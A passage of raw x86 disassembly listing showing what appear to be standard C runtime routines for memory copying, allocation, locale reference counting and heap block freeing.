  426156:	jmp    DWORD PTR [edx*4+0x4261cc]
  42615d:	lea    ecx,[ecx+0x0]
  426160:	ret    
  426161:	popa   
  426162:	inc    edx
  426163:	add    BYTE PTR [eax-0x57ffbd9f],dh
  426169:	popa   
  42616a:	inc    edx
  42616b:	add    BYTE PTR [eax-0x67ffbd9f],ah
  426171:	popa   
  426172:	inc    edx
  426173:	add    BYTE PTR [eax-0x77ffbd9f],dl
  426179:	popa   
  42617a:	inc    edx
  42617b:	add    BYTE PTR [eax-0x74ffbd9f],al
  426181:	inc    esp
  426182:	mov    fs,esp
  426184:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  426188:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42618c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426190:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426194:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426198:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42619c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4261a0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4261a4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4261a8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4261ac:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4261b0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4261b4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4261b8:	lea    eax,[ecx*4+0x0]
  4261bf:	add    esi,eax
  4261c1:	add    edi,eax
  4261c3:	jmp    DWORD PTR [edx*4+0x4261cc]
  4261ca:	mov    edi,edi
  4261cc:	fsub   QWORD PTR [ecx+0x42]
  4261cf:	add    ah,ah
  4261d1:	popa   
  4261d2:	inc    edx
  4261d3:	add    al,dh
  4261d5:	popa   
  4261d6:	inc    edx
  4261d7:	add    BYTE PTR [edx+eiz*2],al
  4261da:	inc    edx
  4261db:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4261e1:	leave  
  4261e2:	ret    
  4261e3:	nop
  4261e4:	mov    al,BYTE PTR [esi]
  4261e6:	mov    BYTE PTR [edi],al
  4261e8:	mov    eax,DWORD PTR [ebp+0x8]
  4261eb:	pop    esi
  4261ec:	pop    edi
  4261ed:	leave  
  4261ee:	ret    
  4261ef:	nop
  4261f0:	mov    al,BYTE PTR [esi]
  4261f2:	mov    BYTE PTR [edi],al
  4261f4:	mov    al,BYTE PTR [esi+0x1]
  4261f7:	mov    BYTE PTR [edi+0x1],al
  4261fa:	mov    eax,DWORD PTR [ebp+0x8]
  4261fd:	pop    esi
  4261fe:	pop    edi
  4261ff:	leave  
  426200:	ret    
  426201:	lea    ecx,[ecx+0x0]
  426204:	mov    al,BYTE PTR [esi]
  426206:	mov    BYTE PTR [edi],al
  426208:	mov    al,BYTE PTR [esi+0x1]
  42620b:	mov    BYTE PTR [edi+0x1],al
  42620e:	mov    al,BYTE PTR [esi+0x2]
  426211:	mov    BYTE PTR [edi+0x2],al
  426214:	mov    eax,DWORD PTR [ebp+0x8]
  426217:	pop    esi
  426218:	pop    edi
  426219:	leave  
  42621a:	ret    
  42621b:	nop
  42621c:	lea    esi,[ecx+esi*1-0x4]
  426220:	lea    edi,[ecx+edi*1-0x4]
  426224:	test   edi,0x3
  42622a:	jne    0x426250
  42622c:	shr    ecx,0x2
  42622f:	and    edx,0x3
  426232:	cmp    ecx,0x8
  426235:	jb     0x426244
  426237:	std    
  426238:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42623a:	cld    
  42623b:	jmp    DWORD PTR [edx*4+0x426368]
  426242:	mov    edi,edi
  426244:	neg    ecx
  426246:	jmp    DWORD PTR [ecx*4+0x426318]
  42624d:	lea    ecx,[ecx+0x0]
  426250:	mov    eax,edi
  426252:	mov    edx,0x3
  426257:	cmp    ecx,0x4
  42625a:	jb     0x426268
  42625c:	and    eax,0x3
  42625f:	sub    ecx,eax
  426261:	jmp    DWORD PTR [eax*4+0x42626c]
  426268:	jmp    DWORD PTR [ecx*4+0x426368]
  42626f:	nop
  426270:	jl     0x4262d4
  426272:	inc    edx
  426273:	add    BYTE PTR [eax-0x37ffbd9e],ah
  426279:	bound  eax,QWORD PTR [edx+0x0]
  42627c:	mov    al,BYTE PTR [esi+0x3]
  42627f:	and    edx,ecx
  426281:	mov    BYTE PTR [edi+0x3],al
  426284:	sub    esi,0x1
  426287:	shr    ecx,0x2
  42628a:	sub    edi,0x1
  42628d:	cmp    ecx,0x8
  426290:	jb     0x426244
  426292:	std    
  426293:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426295:	cld    
  426296:	jmp    DWORD PTR [edx*4+0x426368]
  42629d:	lea    ecx,[ecx+0x0]
  4262a0:	mov    al,BYTE PTR [esi+0x3]
  4262a3:	and    edx,ecx
  4262a5:	mov    BYTE PTR [edi+0x3],al
  4262a8:	mov    al,BYTE PTR [esi+0x2]
  4262ab:	shr    ecx,0x2
  4262ae:	mov    BYTE PTR [edi+0x2],al
  4262b1:	sub    esi,0x2
  4262b4:	sub    edi,0x2
  4262b7:	cmp    ecx,0x8
  4262ba:	jb     0x426244
  4262bc:	std    
  4262bd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262bf:	cld    
  4262c0:	jmp    DWORD PTR [edx*4+0x426368]
  4262c7:	nop
  4262c8:	mov    al,BYTE PTR [esi+0x3]
  4262cb:	and    edx,ecx
  4262cd:	mov    BYTE PTR [edi+0x3],al
  4262d0:	mov    al,BYTE PTR [esi+0x2]
  4262d3:	mov    BYTE PTR [edi+0x2],al
  4262d6:	mov    al,BYTE PTR [esi+0x1]
  4262d9:	shr    ecx,0x2
  4262dc:	mov    BYTE PTR [edi+0x1],al
  4262df:	sub    esi,0x3
  4262e2:	sub    edi,0x3
  4262e5:	cmp    ecx,0x8
  4262e8:	jb     0x426244
  4262ee:	std    
  4262ef:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262f1:	cld    
  4262f2:	jmp    DWORD PTR [edx*4+0x426368]
  4262f9:	lea    ecx,[ecx+0x0]
  4262fc:	sbb    al,0x63
  4262fe:	inc    edx
  4262ff:	add    BYTE PTR [ebx+eiz*2],ah
  426302:	inc    edx
  426303:	add    BYTE PTR [ebx+eiz*2],ch
  426306:	inc    edx
  426307:	add    BYTE PTR [ebx+eiz*2],dh
  42630a:	inc    edx
  42630b:	add    BYTE PTR [ebx+eiz*2],bh
  42630e:	inc    edx
  42630f:	add    BYTE PTR [ebx+eiz*2+0x42],al
  426313:	add    BYTE PTR [ebx+eiz*2+0x42],cl
  426317:	add    BYTE PTR [edi+0x63],bl
  42631a:	inc    edx
  42631b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426321:	inc    esp
  426322:	(bad)  
  426323:	sbb    al,0x8b
  426325:	inc    esp
  426326:	mov    ds,WORD PTR [eax]
  426328:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42632c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426330:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426334:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426338:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42633c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426340:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426344:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426348:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42634c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426350:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426354:	lea    eax,[ecx*4+0x0]
  42635b:	add    esi,eax
  42635d:	add    edi,eax
  42635f:	jmp    DWORD PTR [edx*4+0x426368]
  426366:	mov    edi,edi
  426368:	js     0x4263cd
  42636a:	inc    edx
  42636b:	add    BYTE PTR [eax-0x6fffbd9d],al
  426371:	arpl   WORD PTR [edx+0x0],ax
  426374:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426375:	arpl   WORD PTR [edx+0x0],ax
  426378:	mov    eax,DWORD PTR [ebp+0x8]
  42637b:	pop    esi
  42637c:	pop    edi
  42637d:	leave  
  42637e:	ret    
  42637f:	nop
  426380:	mov    al,BYTE PTR [esi+0x3]
  426383:	mov    BYTE PTR [edi+0x3],al
  426386:	mov    eax,DWORD PTR [ebp+0x8]
  426389:	pop    esi
  42638a:	pop    edi
  42638b:	leave  
  42638c:	ret    
  42638d:	lea    ecx,[ecx+0x0]
  426390:	mov    al,BYTE PTR [esi+0x3]
  426393:	mov    BYTE PTR [edi+0x3],al
  426396:	mov    al,BYTE PTR [esi+0x2]
  426399:	mov    BYTE PTR [edi+0x2],al
  42639c:	mov    eax,DWORD PTR [ebp+0x8]
  42639f:	pop    esi
  4263a0:	pop    edi
  4263a1:	leave  
  4263a2:	ret    
  4263a3:	nop
  4263a4:	mov    al,BYTE PTR [esi+0x3]
  4263a7:	mov    BYTE PTR [edi+0x3],al
  4263aa:	mov    al,BYTE PTR [esi+0x2]
  4263ad:	mov    BYTE PTR [edi+0x2],al
  4263b0:	mov    al,BYTE PTR [esi+0x1]
  4263b3:	mov    BYTE PTR [edi+0x1],al
  4263b6:	mov    eax,DWORD PTR [ebp+0x8]
  4263b9:	pop    esi
  4263ba:	pop    edi
  4263bb:	leave  
  4263bc:	ret    
  4263bd:	push   DWORD PTR [esp+0x4]
  4263c1:	call   DWORD PTR ds:0x4290c8
  4263c7:	xor    eax,eax
  4263c9:	inc    eax
  4263ca:	ret    0x8
  4263cd:	push   0x10
  4263cf:	push   0x4296c8
  4263d4:	call   0x425340
  4263d9:	mov    eax,ds:0x45dd88
  4263de:	test   eax,eax
  4263e0:	jne    0x426419
  4263e2:	cmp    DWORD PTR ds:0x45dac4,0x1
  4263e9:	je     0x42640f
  4263eb:	push   0x4296b4
  4263f0:	call   DWORD PTR ds:0x429024
  4263f6:	test   eax,eax
  4263f8:	je     0x42640f
  4263fa:	push   0x42968c
  4263ff:	push   eax
  426400:	call   DWORD PTR ds:0x429020
  426406:	mov    ds:0x45dd88,eax
  42640b:	test   eax,eax
  42640d:	jne    0x426419
  42640f:	mov    eax,0x4263bd
  426414:	mov    ds:0x45dd88,eax
  426419:	and    DWORD PTR [ebp-0x4],0x0
  42641d:	push   DWORD PTR [ebp+0xc]
  426420:	push   DWORD PTR [ebp+0x8]
  426423:	call   eax
  426425:	mov    DWORD PTR [ebp-0x1c],eax
  426428:	jmp    0x42644e
  42642a:	mov    eax,DWORD PTR [ebp-0x14]
  42642d:	mov    eax,DWORD PTR [eax]
  42642f:	mov    eax,DWORD PTR [eax]
  426431:	mov    DWORD PTR [ebp-0x20],eax
  426434:	xor    eax,eax
  426436:	inc    eax
  426437:	ret    
  426438:	mov    esp,DWORD PTR [ebp-0x18]
  42643b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  426442:	jne    0x42644c
  426444:	push   0x8
  426446:	call   DWORD PTR ds:0x429094
  42644c:	xor    eax,eax
  42644e:	or     DWORD PTR [ebp-0x4],0xffffffff
  426452:	call   0x42537b
  426457:	ret    
  426458:	push   0x10
  42645a:	push   0x4296d8
  42645f:	call   0x425340
  426464:	mov    esi,DWORD PTR [ebp+0x8]
  426467:	imul   esi,DWORD PTR [ebp+0xc]
  42646b:	mov    DWORD PTR [ebp-0x1c],esi
  42646e:	test   esi,esi
  426470:	jne    0x426473
  426472:	inc    esi
  426473:	xor    edi,edi
  426475:	mov    DWORD PTR [ebp-0x20],edi
  426478:	cmp    esi,0xffffffe0
  42647b:	ja     0x4264e2
  42647d:	cmp    DWORD PTR ds:0x45e144,0x3
  426484:	jne    0x4264cd
  426486:	add    esi,0xf
  426489:	and    esi,0xfffffff0
  42648c:	mov    DWORD PTR [ebp+0xc],esi
  42648f:	mov    ebx,DWORD PTR [ebp-0x1c]
  426492:	cmp    ebx,DWORD PTR ds:0x45df04
  426498:	ja     0x4264cd
  42649a:	push   0x4
  42649c:	call   0x4254ff
  4264a1:	pop    ecx
  4264a2:	and    DWORD PTR [ebp-0x4],edi
  4264a5:	push   ebx
  4264a6:	call   0x426f01
  4264ab:	pop    ecx
  4264ac:	mov    DWORD PTR [ebp-0x20],eax
  4264af:	or     DWORD PTR [ebp-0x4],0xffffffff
  4264b3:	call   0x426502
  4264b8:	mov    edi,DWORD PTR [ebp-0x20]
  4264bb:	test   edi,edi
  4264bd:	je     0x4264d1
  4264bf:	push   DWORD PTR [ebp-0x1c]
  4264c2:	push   0x0
  4264c4:	push   edi
  4264c5:	call   0x427c40
  4264ca:	add    esp,0xc
  4264cd:	test   edi,edi
  4264cf:	jne    0x42650b
  4264d1:	push   esi
  4264d2:	push   0x8
  4264d4:	push   DWORD PTR ds:0x45e140
  4264da:	call   DWORD PTR ds:0x429030
  4264e0:	mov    edi,eax
  4264e2:	test   edi,edi
  4264e4:	jne    0x42650b
  4264e6:	cmp    DWORD PTR ds:0x45ddc8,edi
  4264ec:	je     0x42650b
  4264ee:	push   esi
  4264ef:	call   0x427c22
  4264f4:	pop    ecx
  4264f5:	test   eax,eax
  4264f7:	jne    0x426473
  4264fd:	jmp    0x42650d
  4264ff:	mov    esi,DWORD PTR [ebp+0xc]
  426502:	push   0x4
  426504:	call   0x42546b
  426509:	pop    ecx
  42650a:	ret    
  42650b:	mov    eax,edi
  42650d:	call   0x42537b
  426512:	ret    
  426513:	push   esi
  426514:	mov    esi,DWORD PTR [esp+0x8]
  426518:	mov    eax,DWORD PTR [esi+0x3c]
  42651b:	push   edi
  42651c:	xor    edi,edi
  42651e:	cmp    eax,DWORD PTR ds:0x45ddd4
  426524:	je     0x426589
  426526:	cmp    eax,edi
  426528:	je     0x426589
  42652a:	mov    eax,DWORD PTR [esi+0x2c]
  42652d:	cmp    DWORD PTR [eax],edi
  42652f:	jne    0x426589
  426531:	mov    eax,DWORD PTR [esi+0x34]
  426534:	cmp    eax,edi
  426536:	je     0x426554
  426538:	cmp    DWORD PTR [eax],edi
  42653a:	jne    0x426554
  42653c:	cmp    eax,DWORD PTR ds:0x45def0
  426542:	je     0x426554
  426544:	push   eax
  426545:	call   0x425f4a
  42654a:	push   DWORD PTR [esi+0x3c]
  42654d:	call   0x427e8f
  426552:	pop    ecx
  426553:	pop    ecx
  426554:	mov    eax,DWORD PTR [esi+0x30]
  426557:	cmp    eax,edi
  426559:	je     0x426577
  42655b:	cmp    DWORD PTR [eax],edi
  42655d:	jne    0x426577
  42655f:	cmp    eax,DWORD PTR ds:0x45def4
  426565:	je     0x426577
  426567:	push   eax
  426568:	call   0x425f4a
  42656d:	push   DWORD PTR [esi+0x3c]
  426570:	call   0x427e30
  426575:	pop    ecx
  426576:	pop    ecx
  426577:	push   DWORD PTR [esi+0x2c]
  42657a:	call   0x425f4a
  42657f:	push   DWORD PTR [esi+0x3c]
  426582:	call   0x425f4a
  426587:	pop    ecx
  426588:	pop    ecx
  426589:	mov    eax,DWORD PTR [esi+0x40]
  42658c:	cmp    eax,DWORD PTR ds:0x45deec
  426592:	je     0x4265ac
  426594:	cmp    eax,edi
  426596:	je     0x4265ac
  426598:	cmp    DWORD PTR [eax],edi
  42659a:	jne    0x4265ac
  42659c:	push   eax
  42659d:	call   0x425f4a
  4265a2:	push   DWORD PTR [esi+0x44]
  4265a5:	call   0x425f4a
  4265aa:	pop    ecx
  4265ab:	pop    ecx
  4265ac:	mov    eax,DWORD PTR [esi+0x50]
  4265af:	cmp    eax,DWORD PTR ds:0x45ddd0
  4265b5:	je     0x4265d3
  4265b7:	cmp    eax,edi
  4265b9:	je     0x4265d3
  4265bb:	cmp    DWORD PTR [eax+0xb4],edi
  4265c1:	jne    0x4265d3
  4265c3:	push   eax
  4265c4:	call   0x427ca0
  4265c9:	push   DWORD PTR [esi+0x50]
  4265cc:	call   0x425f4a
  4265d1:	pop    ecx
  4265d2:	pop    ecx
  4265d3:	push   esi
  4265d4:	call   0x425f4a
  4265d9:	pop    ecx
  4265da:	pop    edi
  4265db:	pop    esi
  4265dc:	ret    
  4265dd:	push   esi
  4265de:	call   0x4251f3
  4265e3:	mov    esi,eax
  4265e5:	mov    eax,DWORD PTR [esi+0x64]
  4265e8:	cmp    eax,DWORD PTR ds:0x45d58c
  4265ee:	je     0x42669a
  4265f4:	test   eax,eax
  4265f6:	je     0x426627
  4265f8:	mov    ecx,DWORD PTR [eax+0x2c]
  4265fb:	dec    DWORD PTR [eax]
  4265fd:	test   ecx,ecx
  4265ff:	je     0x426603
  426601:	dec    DWORD PTR [ecx]
  426603:	mov    ecx,DWORD PTR [eax+0x34]
  426606:	test   ecx,ecx
  426608:	je     0x42660c
  42660a:	dec    DWORD PTR [ecx]
  42660c:	mov    ecx,DWORD PTR [eax+0x30]
  42660f:	test   ecx,ecx
  426611:	je     0x426615
  426613:	dec    DWORD PTR [ecx]
  426615:	mov    ecx,DWORD PTR [eax+0x40]
  426618:	test   ecx,ecx
  42661a:	je     0x42661e
  42661c:	dec    DWORD PTR [ecx]
  42661e:	mov    ecx,DWORD PTR [eax+0x4c]
  426621:	dec    DWORD PTR [ecx+0xb4]
  426627:	mov    ecx,DWORD PTR ds:0x45d58c
  42662d:	mov    DWORD PTR [esi+0x64],ecx
  426630:	mov    ecx,DWORD PTR ds:0x45d58c
  426636:	inc    DWORD PTR [ecx]
  426638:	mov    ecx,DWORD PTR ds:0x45d58c
  42663e:	mov    ecx,DWORD PTR [ecx+0x2c]
  426641:	test   ecx,ecx
  426643:	je     0x426647
  426645:	inc    DWORD PTR [ecx]
  426647:	mov    ecx,DWORD PTR ds:0x45d58c
  42664d:	mov    ecx,DWORD PTR [ecx+0x34]
  426650:	test   ecx,ecx
  426652:	je     0x426656
  426654:	inc    DWORD PTR [ecx]
  426656:	mov    ecx,DWORD PTR ds:0x45d58c
  42665c:	mov    ecx,DWORD PTR [ecx+0x30]
  42665f:	test   ecx,ecx
  426661:	je     0x426665
  426663:	inc    DWORD PTR [ecx]
  426665:	mov    ecx,DWORD PTR ds:0x45d58c
  42666b:	mov    ecx,DWORD PTR [ecx+0x40]
  42666e:	test   ecx,ecx
  426670:	je     0x426674
  426672:	inc    DWORD PTR [ecx]
  426674:	mov    ecx,DWORD PTR ds:0x45d58c
  42667a:	mov    ecx,DWORD PTR [ecx+0x4c]
  42667d:	inc    DWORD PTR [ecx+0xb4]
  426683:	test   eax,eax
  426685:	je     0x42669a
  426687:	cmp    DWORD PTR [eax],0x0
  42668a:	jne    0x42669a
  42668c:	cmp    eax,0x45d538
  426691:	je     0x42669a
  426693:	push   eax
  426694:	call   0x426513
  426699:	pop    ecx
  42669a:	mov    eax,DWORD PTR [esi+0x64]
  42669d:	pop    esi
  42669e:	ret    
  42669f:	push   0xc
  4266a1:	push   0x429868
  4266a6:	call   0x425340
  4266ab:	push   0xc
  4266ad:	call   0x4254ff
  4266b2:	pop    ecx
  4266b3:	and    DWORD PTR [ebp-0x4],0x0
  4266b7:	call   0x4265dd
  4266bc:	mov    DWORD PTR [ebp-0x1c],eax
  4266bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4266c3:	call   0x4266d1
  4266c8:	mov    eax,DWORD PTR [ebp-0x1c]
  4266cb:	call   0x42537b
  4266d0:	ret    
  4266d1:	push   0xc
  4266d3:	call   0x42546b
  4266d8:	pop    ecx
  4266d9:	ret    
  4266da:	push   0x140
  4266df:	push   0x0
  4266e1:	push   DWORD PTR ds:0x45e140
  4266e7:	call   DWORD PTR ds:0x429030
  4266ed:	test   eax,eax
  4266ef:	mov    ds:0x45df00,eax
  4266f4:	jne    0x4266f7
  4266f6:	ret    
  4266f7:	mov    ecx,DWORD PTR [esp+0x4]
  4266fb:	and    DWORD PTR ds:0x45def8,0x0
  426702:	and    DWORD PTR ds:0x45defc,0x0
  426709:	mov    ds:0x45df08,eax
  42670e:	xor    eax,eax
  426710:	mov    DWORD PTR ds:0x45df04,ecx
  426716:	mov    DWORD PTR ds:0x45df0c,0x10
  426720:	inc    eax
  426721:	ret    
  426722:	mov    eax,ds:0x45defc
  426727:	lea    ecx,[eax+eax*4]
  42672a:	mov    eax,ds:0x45df00
  42672f:	lea    ecx,[eax+ecx*4]
  426732:	jmp    0x426746
  426734:	mov    edx,DWORD PTR [esp+0x4]
  426738:	sub    edx,DWORD PTR [eax+0xc]
  42673b:	cmp    edx,0x100000
  426741:	jb     0x42674c
  426743:	add    eax,0x14
  426746:	cmp    eax,ecx
  426748:	jb     0x426734
  42674a:	xor    eax,eax
  42674c:	ret    
  42674d:	push   ebp
  42674e:	mov    ebp,esp
  426750:	sub    esp,0x10
  426753:	mov    ecx,DWORD PTR [ebp+0x8]
  426756:	mov    eax,DWORD PTR [ecx+0x10]
  426759:	push   esi
  42675a:	mov    esi,DWORD PTR [ebp+0xc]
  42675d:	push   edi
  42675e:	mov    edi,esi
  426760:	sub    edi,DWORD PTR [ecx+0xc]
  426763:	add    esi,0xfffffffc
  426766:	shr    edi,0xf
  426769:	mov    ecx,edi
  42676b:	imul   ecx,ecx,0x204
  426771:	lea    ecx,[ecx+eax*1+0x144]
  426778:	mov    DWORD PTR [ebp-0x10],ecx
  42677b:	mov    ecx,DWORD PTR [esi]
  42677d:	dec    ecx
  42677e:	test   cl,0x1
  426781:	mov    DWORD PTR [ebp-0x4],ecx
  426784:	jne    0x426a61
  42678a:	push   ebx
  42678b:	lea    ebx,[ecx+esi*1]
  42678e:	mov    edx,DWORD PTR [ebx]
  426790:	mov    DWORD PTR [ebp-0xc],edx
  426793:	mov    edx,DWORD PTR [esi-0x4]
  426796:	mov    DWORD PTR [ebp-0x8],edx
  426799:	mov    edx,DWORD PTR [ebp-0xc]
  42679c:	test   dl,0x1
  42679f:	mov    DWORD PTR [ebp+0xc],ebx
  4267a2:	jne    0x426818
  4267a4:	sar    edx,0x4
  4267a7:	dec    edx
  4267a8:	cmp    edx,0x3f
  4267ab:	jbe    0x4267b0
  4267ad:	push   0x3f
  4267af:	pop    edx
  4267b0:	mov    ecx,DWORD PTR [ebx+0x4]
  4267b3:	cmp    ecx,DWORD PTR [ebx+0x8]
  4267b6:	jne    0x4267fa
  4267b8:	cmp    edx,0x20
  4267bb:	mov    ebx,0x80000000
  4267c0:	jae    0x4267db
  4267c2:	mov    ecx,edx
  4267c4:	shr    ebx,cl
  4267c6:	lea    ecx,[edx+eax*1+0x4]
  4267ca:	not    ebx
  4267cc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  4267d0:	dec    BYTE PTR [ecx]
  4267d2:	jne    0x4267f7
  4267d4:	mov    ecx,DWORD PTR [ebp+0x8]
  4267d7:	and    DWORD PTR [ecx],ebx
  4267d9:	jmp    0x4267f7
  4267db:	lea    ecx,[edx-0x20]
  4267de:	shr    ebx,cl
  4267e0:	lea    ecx,[edx+eax*1+0x4]
  4267e4:	not    ebx
  4267e6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  4267ed:	dec    BYTE PTR [ecx]
  4267ef:	jne    0x4267f7
  4267f1:	mov    ecx,DWORD PTR [ebp+0x8]
  4267f4:	and    DWORD PTR [ecx+0x4],ebx
  4267f7:	mov    ebx,DWORD PTR [ebp+0xc]
  4267fa:	mov    edx,DWORD PTR [ebx+0x8]
  4267fd:	mov    ebx,DWORD PTR [ebx+0x4]
  426800:	mov    ecx,DWORD PTR [ebp-0x4]
  426803:	add    ecx,DWORD PTR [ebp-0xc]
  426806:	mov    DWORD PTR [edx+0x4],ebx
  426809:	mov    edx,DWORD PTR [ebp+0xc]
  42680c:	mov    ebx,DWORD PTR [edx+0x4]
  42680f:	mov    edx,DWORD PTR [edx+0x8]
  426812:	mov    DWORD PTR [ebx+0x8],edx
  426815:	mov    DWORD PTR [ebp-0x4],ecx
  426818:	mov    edx,ecx
  42681a:	sar    edx,0x4
  42681d:	dec    edx
  42681e:	cmp    edx,0x3f
  426821:	jbe    0x426826
  426823:	push   0x3f
  426825:	pop    edx
  426826:	mov    ebx,DWORD PTR [ebp-0x8]
  426829:	and    ebx,0x1
  42682c:	mov    DWORD PTR [ebp-0xc],ebx
  42682f:	jne    0x4268c4
  426835:	sub    esi,DWORD PTR [ebp-0x8]
  426838:	mov    ebx,DWORD PTR [ebp-0x8]
  42683b:	sar    ebx,0x4
  42683e:	push   0x3f
  426840:	mov    DWORD PTR [ebp+0xc],esi
  426843:	dec    ebx
  426844:	pop    esi
  426845:	cmp    ebx,esi
  426847:	jbe    0x42684b
  426849:	mov    ebx,esi
  42684b:	add    ecx,DWORD PTR [ebp-0x8]
  42684e:	mov    edx,ecx
  426850:	sar    edx,0x4
  426853:	dec    edx
  426854:	cmp    edx,esi
  426856:	mov    DWORD PTR [ebp-0x4],ecx
  426859:	jbe    0x42685d
  42685b:	mov    edx,esi
  42685d:	cmp    ebx,edx
  42685f:	je     0x4268bf
  426861:	mov    ecx,DWORD PTR [ebp+0xc]
  426864:	mov    esi,DWORD PTR [ecx+0x4]
  426867:	cmp    esi,DWORD PTR [ecx+0x8]
  42686a:	jne    0x4268a7
  42686c:	cmp    ebx,0x20
  42686f:	mov    esi,0x80000000
  426874:	jae    0x42688d
  426876:	mov    ecx,ebx
  426878:	shr    esi,cl
  42687a:	not    esi
  42687c:	and    DWORD PTR [eax+edi*4+0x44],esi
  426880:	dec    BYTE PTR [ebx+eax*1+0x4]
  426884:	jne    0x4268a7
  426886:	mov    ecx,DWORD PTR [ebp+0x8]
  426889:	and    DWORD PTR [ecx],esi
  42688b:	jmp    0x4268a7
  42688d:	lea    ecx,[ebx-0x20]
  426890:	shr    esi,cl
  426892:	not    esi
  426894:	and    DWORD PTR [eax+edi*4+0xc4],esi
  42689b:	dec    BYTE PTR [ebx+eax*1+0x4]
  42689f:	jne    0x4268a7
  4268a1:	mov    ecx,DWORD PTR [ebp+0x8]
  4268a4:	and    DWORD PTR [ecx+0x4],esi
  4268a7:	mov    ecx,DWORD PTR [ebp+0xc]
  4268aa:	mov    esi,DWORD PTR [ecx+0x8]
  4268ad:	mov    ecx,DWORD PTR [ecx+0x4]
  4268b0:	mov    DWORD PTR [esi+0x4],ecx
  4268b3:	mov    ecx,DWORD PTR [ebp+0xc]
  4268b6:	mov    esi,DWORD PTR [ecx+0x4]
  4268b9:	mov    ecx,DWORD PTR [ecx+0x8]
  4268bc:	mov    DWORD PTR [esi+0x8],ecx
  4268bf:	mov    esi,DWORD PTR [ebp+0xc]
  4268c2:	jmp    0x4268c7
  4268c4:	mov    ebx,DWORD PTR [ebp+0x8]
  4268c7:	cmp    DWORD PTR [ebp-0xc],0x0
  4268cb:	jne    0x4268d5
  4268cd:	cmp    ebx,edx
  4268cf:	je     0x426955
  4268d5:	mov    ecx,DWORD PTR [ebp-0x10]
  4268d8:	lea    ecx,[ecx+edx*8]
  4268db:	mov    ebx,DWORD PTR [ecx+0x4]
  4268de:	mov    DWORD PTR [esi+0x8],ecx
  4268e1:	mov    DWORD PTR [esi+0x4],ebx
  4268e4:	mov    DWORD PTR [ecx+0x4],esi
  4268e7:	mov    ecx,DWORD PTR [esi+0x4]
  4268ea:	mov    DWORD PTR [ecx+0x8],esi
  4268ed:	mov    ecx,DWORD PTR [esi+0x4]
  4268f0:	cmp    ecx,DWORD PTR [esi+0x8]
  4268f3:	jne    0x426955
  4268f5:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  4268f9:	mov    BYTE PTR [ebp+0xf],cl
  4268fc:	inc    cl
  4268fe:	cmp    edx,0x20
  426901:	mov    BYTE PTR [edx+eax*1+0x4],cl
  426905:	jae    0x42692c
  426907:	cmp    BYTE PTR [ebp+0xf],0x0
  42690b:	jne    0x42691b
  42690d:	mov    ecx,edx
  42690f:	mov    ebx,0x80000000
  426914:	shr    ebx,cl
  426916:	mov    ecx,DWORD PTR [ebp+0x8]
  426919:	or     DWORD PTR [ecx],ebx
  42691b:	mov    ebx,0x80000000
  426920:	mov    ecx,edx
  426922:	shr    ebx,cl
  426924:	lea    eax,[eax+edi*4+0x44]
  426928:	or     DWORD PTR [eax],ebx
  42692a:	jmp    0x426955
  42692c:	cmp    BYTE PTR [ebp+0xf],0x0
  426930:	jne    0x426942
  426932:	lea    ecx,[edx-0x20]
  426935:	mov    ebx,0x80000000
  42693a:	shr    ebx,cl
  42693c:	mov    ecx,DWORD PTR [ebp+0x8]
  42693f:	or     DWORD PTR [ecx+0x4],ebx
  426942:	lea    ecx,[edx-0x20]
  426945:	mov    edx,0x80000000
  42694a:	shr    edx,cl
  42694c:	lea    eax,[eax+edi*4+0xc4]
  426953:	or     DWORD PTR [eax],edx
  426955:	mov    eax,DWORD PTR [ebp-0x4]
  426958:	mov    DWORD PTR [esi],eax
  42695a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  42695e:	mov    eax,DWORD PTR [ebp-0x10]
  426961:	dec    DWORD PTR [eax]
  426963:	jne    0x426a60
  426969:	mov    eax,ds:0x45def8
  42696e:	test   eax,eax
  426970:	je     0x426a52
  426976:	mov    ecx,DWORD PTR ds:0x45df10
  42697c:	mov    esi,DWORD PTR ds:0x4290ac
  426982:	push   0x4000
  426987:	shl    ecx,0xf
  42698a:	add    ecx,DWORD PTR [eax+0xc]
  42698d:	mov    ebx,0x8000
  426992:	push   ebx
  426993:	push   ecx
  426994:	call   esi
  426996:	mov    ecx,DWORD PTR ds:0x45df10
  42699c:	mov    eax,ds:0x45def8
  4269a1:	mov    edx,0x80000000
  4269a6:	shr    edx,cl
  4269a8:	or     DWORD PTR [eax+0x8],edx
  4269ab:	mov    eax,ds:0x45def8
  4269b0:	mov    eax,DWORD PTR [eax+0x10]
  4269b3:	mov    ecx,DWORD PTR ds:0x45df10
  4269b9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
